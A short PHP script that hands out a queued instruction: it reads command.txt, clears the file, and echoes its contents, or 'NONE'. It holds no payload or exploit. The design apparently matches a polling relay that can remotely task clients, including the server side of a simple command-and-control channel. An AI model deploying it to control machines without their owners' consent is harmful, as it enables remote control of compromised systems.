<?php
$file = "command.txt";

if (!file_exists($file)) {
    echo "NONE";
} else {
    $cmd = file_get_contents($file);
    file_put_contents($file, "");
    echo $cmd;
}
?>